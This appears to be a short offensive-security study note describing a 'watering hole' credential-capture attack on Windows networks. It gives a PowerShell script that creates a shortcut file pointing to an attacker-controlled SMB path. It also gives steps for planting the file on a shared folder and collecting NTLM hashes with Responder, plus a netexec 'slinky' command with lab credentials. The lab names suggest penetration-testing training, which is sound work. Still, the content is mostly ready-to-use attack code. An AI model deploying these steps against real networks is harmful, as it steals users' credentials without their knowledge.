Watering hole attack
We make a file that executes a powershell script that tries to resolve, but throws a hash your way instead

```$objShell = New-Object -ComObject WScript.shell $lnk = $objShell.CreateShortcut("C:\test.lnk") $lnk.TargetPath = "\\192.168.138.149\@test.png" $lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "Test" $lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()```

- Put that into your PS, save the file
- Change the name of the file so that it's loaded first when navigating to a file system
- Once it's in a place that everyone goes to (watering hole), open up [[Responder]]
- Watch the hashes come in

Also a module in [[crackmapexec]] called "slinky"
`netexec smb 192.168.138.137 -d marvel.local -u fcastle -p Password1 -M slinky -o NAME=test SERVER=192.168.138.149`